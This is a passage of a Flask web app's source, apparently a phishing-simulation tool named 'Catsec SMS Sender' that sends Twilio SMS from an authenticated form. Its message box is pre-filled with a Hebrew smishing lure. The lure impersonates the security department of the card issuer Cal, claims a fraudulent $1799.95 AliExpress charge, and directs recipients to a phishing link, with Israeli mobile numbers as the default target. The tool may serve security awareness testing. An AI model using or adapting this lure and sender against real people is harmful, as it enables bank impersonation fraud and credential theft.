            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            max-width: 500px;
            width: 100%;
        }
        h1 { color: #333; margin-bottom: 10px; font-size: 28px; }
        .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
            font-size: 14px;
        }
        input, textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 14px;
            transition: all 0.3s;
            font-family: inherit;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        textarea { resize: vertical; min-height: 100px; }
        .char-count {
            text-align: right;
            font-size: 12px;
            color: #999;
            margin-top: 5px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }
        button:active { transform: translateY(0); }
        button:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        .alert {
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            display: none;
            animation: slideIn 0.3s;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .alert-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #856404;
        }
        .warning-box strong { display: block; margin-bottom: 5px; }
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logout-btn {
            background: #f44336;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 14px;
            text-decoration: none;
            transition: all 0.3s;
            display: inline-block;
        }
        .logout-btn:hover {
            background: #d32f2f;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header-top">
            <div>
                <h1 style="margin: 0; margin-bottom: 5px;">📱 Catsec SMS Sender</h1>
                <p class="subtitle" style="margin: 0;">Send SMS messages via API</p>
            </div>
            <a href="/logout" class="logout-btn">🚪 Logout</a>
        </div>

        <form id="smsForm">
            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
            <div class="form-group">
                <label for="from">From Number</label>
                <input type="tel" id="from" name="from" value="{{ default_from }}" placeholder="+1234567890" required>
            </div>

            <div class="form-group">
                <label for="to">To Number</label>
                <input type="tel" id="to" name="to" value="+9725" placeholder="+9725XXXXXXX" required>
            </div>

            <div class="form-group">
                <label for="message">Message</label>
                <textarea id="message" name="message" placeholder="Enter your message here..." required maxlength="1600">שלום, כאן מחלקת ביטחון כאל
שמנו לב שבכרטיסיך המסתיים בספרות 4417 בוצעה עסקה בסך 1799.95$ :בחנות אינטרנט Aliexpress LLC
אם לא ביצעת את העסקה, יש לדווח מיידית לכאל בלינק הבא
https://phishing.catsec.com</textarea>
                <div class="char-count"><span id="charCount">0</span> / 1600</div>
            </div>

            <button type="submit" id="sendBtn">Send SMS</button>
        </form>

        <div id="alert" class="alert"></div>
    </div>

    <script>
        const form = document.getElementById('smsForm');
        const alert = document.getElementById('alert');
        const sendBtn = document.getElementById('sendBtn');
        const messageInput = document.getElementById('message');
        const charCount = document.getElementById('charCount');

        // Character counter - initialize on load
        charCount.textContent = messageInput.value.length;

        messageInput.addEventListener('input', function() {
            charCount.textContent = this.value.length;
        });

        function showAlert(message, type) {
            alert.textContent = message;
            alert.className = `alert alert-${type}`;
            alert.style.display = 'block';

            if (type === 'success') {
                setTimeout(() => {
                    alert.style.display = 'none';
                }, 5000);
            }
        }

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const formData = new FormData(form);
            const csrfToken = formData.get('csrf_token');
            const data = {
                from: formData.get('from'),
                to: formData.get('to'),
                message: formData.get('message')
            };

            sendBtn.disabled = true;
            sendBtn.innerHTML = '<span class="spinner"></span>Sending...';
            alert.style.display = 'none';

            try {
                const response = await fetch('/send', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRFToken': csrfToken
                    },
                    body: JSON.stringify(data)
                });

                const result = await response.json();

                if (response.ok) {
                    showAlert(`✅ Message sent! SID: ${result.sid}`, 'success');
                    form.reset();
                    charCount.textContent = '0';
                } else {
                    showAlert(`❌ Error: ${result.error}`, 'error');
                }
            } catch (error) {
                showAlert(`❌ Network error: ${error.message}`, 'error');
            } finally {
                sendBtn.disabled = false;
                sendBtn.innerHTML = 'Send SMS';
            }
        });
    </script>
</body>
</html>
"""

@app.route('/sms', methods=['GET'])
@require_auth
def sms_sender():
    """SMS sender interface"""
    return render_template_string(SMS_TEMPLATE, default_from=DEFAULT_FROM)

@app.route('/send', methods=['POST'])
@require_auth
def send_sms():
    """Send SMS via Twilio"""
    try:
        data = request.get_json()

        from_number = data.get('from')
        to_number = data.get('to')
        message_body = data.get('message')

        if not all([from_number, to_number, message_body]):
            return jsonify({'error': 'Missing required fields'}), 400

        client = Client(ACCOUNT_SID, AUTH_TOKEN)
        message = client.messages.create(
            body=message_body,
            from_=from_number,
            to=to_number
        )

        return jsonify({
            'success': True,
            'sid': message.sid,
            'status': message.status
        })

    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':

    app.run(debug=False, host='0.0.0.0', port=9999)
